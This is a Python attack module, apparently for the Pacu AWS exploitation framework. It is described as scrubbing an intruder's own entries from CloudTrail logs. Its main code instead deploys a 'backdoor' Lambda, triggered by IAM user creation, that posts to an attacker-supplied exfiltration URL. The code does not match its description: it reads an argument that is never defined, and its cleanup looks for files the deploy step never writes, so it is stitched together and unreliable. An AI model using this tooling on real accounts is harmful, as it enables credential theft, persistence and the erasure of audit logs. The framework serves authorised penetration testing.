#!/usr/bin/env python3
import argparse
from botocore.exceptions import ClientError
from copy import deepcopy
import subprocess
import random
import string
import os


module_info = {
    'name': 'lambda__intercept_cloudtrail_logs',

    'author': 'Spencer Gietzen of Rhino Security Labs',

    'category': 'EVADE',

    'one_liner': 'Creates a Lambda function and S3 event trigger to scrub CloudTrail logs of our own logs.',

    'description': 'This module creates a new Lambda function and an accompanying S3 event trigger that will trigger upon a new file being put into any buckets you specify. The Lambda function will determine if the file that was placed in the bucket is a CloudTrail log file, and if it is, it will download it, then remove any "AccessDenied" logs related to the Lambda function and any logs coming from the user/role name you specify. It will then re-upload that file ontop of the old one. Note: An IAM role that has the S3 GetObject and S3 PutObject permissions is required to be attached to the Lambda function when it is created.',

    'services': ['Lambda', 'S3', 'IAM'],

    'prerequisite_modules': ['iam__enum_users_roles_policies_groups'],

    'external_dependencies': [],

    'arguments_to_autocomplete': ['--role-arn', '--buckets', '--user-names', '--role-names', '--cleanup'],
}

parser = argparse.ArgumentParser(add_help=False, description=module_info['description'])

parser.add_argument('--role-arn', required=False, default=None, help='The ARN of the role to attach to the Lambda function that gets created. Must have S3 GetObject and S3 PutObject permissions.')
parser.add_argument('--buckets', required=True, help='The S3 bucket(s) to target. An event trigger will be added to each bucket and for every item that is put into that bucket, our Lambda function will be invoked. These buckets should be where CloudTrail trails are saving their logs in the account.')
parser.add_argument('--user-names', required=False, default=None, help='The user names of any users that you want to remove logs for. The Lambda function will delete any logs from the CloudTrail output that originate from these users. One of either this argument or --role-name is required.')
parser.add_argument('--role-names', required=False, default=None, help='The role names of any roles that you want to remove logs for. The Lambda function will delete any logs from the CloudTrail output that originate from these roles. One of either this argument or --user-name is required.')
parser.add_argument('--cleanup', required=False, default=False, action='store_true', help='Run the module in cleanup mode. This will remove any known CloudTrail interceptors that the module added from the account.')


def main(args, pacu_main):
    session = pacu_main.get_active_session()

    ######
    args = parser.parse_args(args)
    print = pacu_main.print
    input = pacu_main.input
    fetch_data = pacu_main.fetch_data
    ######

    if args.cleanup:
        created_lambda_functions = []
        created_s3_triggers = []

        if os.path.isfile('./modules/{}/created-lambda-functions.txt'.format(module_info['name'])):
            with open('./modules/{}/created-lambda-functions.txt'.format(module_info['name']), 'r') as f:
                created_lambda_functions = f.readlines()
        if os.path.isfile('./modules/{}/created-s3-event-triggers.txt'.format(module_info['name'])):
            with open('./modules/{}/created-s3-event-triggers.txt'.format(module_info['name']), 'r') as f:
                created_s3_triggers = f.readlines()

        if created_lambda_functions:
            delete_function_file = True
            for function in created_lambda_functions:
                name = function.rstrip()
                print('  Deleting function {}...'.format(name))
                client = pacu_main.get_boto3_client('lambda', 'us-east-1')
                try:
                    client.delete_function(
                        FunctionName=name
                    )
                except ClientError as error:
                    code = error.response['Error']['Code']
                    if code == 'AccessDeniedException':
                        print('  FAILURE: MISSING NEEDED PERMISSIONS')
                    else:
                        print(code)
                    delete_function_file = False
                    break
            if delete_function_file:
                try:
                    os.remove('./modules/{}/created-lambda-functions.txt'.format(module_info['name']))
                except Exception as error:
                    print('  Failed to remove ./modules/{}/created-lambda-functions.txt'.format(module_info['name']))

        if created_s3_triggers:
            delete_s3_file = True
            for trigger in created_s3_triggers:
                name = trigger.rstrip()
                print('  Deleting S3 trigger {}...'.format(name))
                client = pacu_main.get_boto3_client('events', 'us-east-1')
                try:
                    client.remove_targets(
                        Rule=name,
                        Ids=['0']
                    )
                    client.delete_rule(
                        Name=name
                    )
                except ClientError as error:
                    code = error.response['Error']['Code']
                    if code == 'AccessDeniedException':
                        print('  FAILURE: MISSING NEEDED PERMISSIONS')
                    else:
                        print(code)
                    delete_s3_file = False
                    break
            if delete_s3_file:
                try:
                    os.remove('./modules/{}/created-s3-event-triggers.txt'.format(module_info['name']))
                except Exception as error:
                    print('  Failed to remove ./modules/{}/created-s3-event-triggers.txt'.format(module_info['name']))

        print('Completed cleanup mode.\n')
        return {'cleanup': True}

    if not args.exfil_url:
        print('  --exfil-url is required if you are not running in cleanup mode!')
        return

    data = {'functions_created': 0, 'rules_created': 0, 'successes': 0}

    created_resources = {'LambdaFunctions': [], 'CWERules': []}

    target_role_arn = input('  What role should be used? Note: The role should allow Lambda to assume it and have at least the IAM CreateAccessKey permission. Enter the ARN now or just press enter to enumerate a list of possible roles to choose from: ')
    if not target_role_arn:
        if fetch_data(['IAM', 'Roles'], module_info['prerequisite_modules'][0], '--roles', force=True) is False:
            print('Pre-req module not run successfully. Exiting...')
            return False
        roles = deepcopy(session.IAM['Roles'])

        print('Found {} roles. Choose one below.'.format(len(roles)))
        for i in range(0, len(roles)):
            print('  [{}] {}'.format(i, roles[i]['RoleName']))
        choice = input('Choose an option: ')
        target_role_arn = roles[int(choice)]['Arn']

    # Import the Lambda function and modify the variables it needs
    with open('./modules/{}/lambda_function.py.bak'.format(module_info['name']), 'r') as f:
        code = f.read()

    code = code.replace('POST_URL', args.exfil_url)

    with open('./modules/{}/lambda_function.py'.format(module_info['name']), 'w+') as f:
        f.write(code)

    # Zip the Lambda function
    try:
        print('  Zipping the Lambda function...\n')
        subprocess.run('cd ./modules/{}/ && rm -f lambda_function.zip && zip lambda_function.zip lambda_function.py && cd ../../'.format(module_info['name']), shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except Exception as error:
        print('Failed to zip the Lambda function locally: {}\n'.format(error))
        return data

    with open('./modules/{}/lambda_function.zip'.format(module_info['name']), 'rb') as f:
        zip_file_bytes = f.read()

    client = pacu_main.get_boto3_client('lambda', 'us-east-1')

    try:
        function_name = ''.join(random.choice(string.ascii_lowercase + string.digits) for _ in range(15))
        response = client.create_function(
            FunctionName=function_name,
            Runtime='python3.6',
            Role=target_role_arn,
            Handler='lambda_function.lambda_handler',
            Code={
                'ZipFile': zip_file_bytes
            }
        )
        lambda_arn = response['FunctionArn']
        print('  Created Lambda function: {}'.format(function_name))
        data['functions_created'] += 1
        created_resources['LambdaFunctions'].append(function_name)

        client = pacu_main.get_boto3_client('events', 'us-east-1')

        response = client.put_rule(
            Name=function_name,
            EventPattern='{"source":["aws.iam"],"detail-type":["AWS API Call via CloudTrail"],"detail":{"eventSource":["iam.amazonaws.com"],"eventName":["CreateUser"]}}',
            State='ENABLED'
        )
        print('  Created CloudWatch Events rule: {}'.format(response['RuleArn']))
        data['rules_created'] += 1

        client = pacu_main.get_boto3_client('lambda', 'us-east-1')

        client.add_permission(
            FunctionName=function_name,
            StatementId=''.join(random.choice(string.ascii_lowercase + string.digits) for _ in range(10)),
            Action='lambda:InvokeFunction',
            Principal='events.amazonaws.com',
            SourceArn=response['RuleArn']
        )

        client = pacu_main.get_boto3_client('events', 'us-east-1')

        response = client.put_targets(
            Rule=function_name,
            Targets=[
                {
                    'Id': '0',
                    'Arn': lambda_arn
                }
            ]
        )
        if response['FailedEntryCount'] > 0:
            print('Failed to add the Lambda function as a target to the CloudWatch rule. Failed entries:')
            print(response['FailedEntries'])
        else:
            print('  Added Lambda target to CloudWatch Events rule.')
            data['successes'] += 1
            created_resources['CWERules'].append(function_name)
    except ClientError as error:
        code = error.response['Error']['Code']
        if code == 'AccessDeniedException':
            print('  FAILURE: MISSING NEEDED PERMISSIONS')
        else:
            print(code)

    if created_resources['LambdaFunctions']:
        with open('./modules/{}/created-lambda-functions.txt'.format(module_info['name']), 'w+') as f:
            f.write('\n'.join(created_resources['LambdaFunctions']))
    if created_resources['CWERules']:
        with open('./modules/{}/created-cloudwatch-events-rules.txt'.format(module_info['name']), 'w+') as f:
            f.write('\n'.join(created_resources['CWERules']))

    print('Warning: Your backdoor will not execute if the account does not have an active CloudTrail trail in us-east-1.')

    return data


def summary(data, pacu_main):
    if data.get('cleanup'):
        return '  Completed cleanup of Lambda functions and CloudWatch Events rules.'

    return '  Lambda functions created: {}\n  CloudWatch Events rules created: {}\n  Successful backdoor deployments: {}\n'.format(data['functions_created'], data['rules_created'], data['successes'])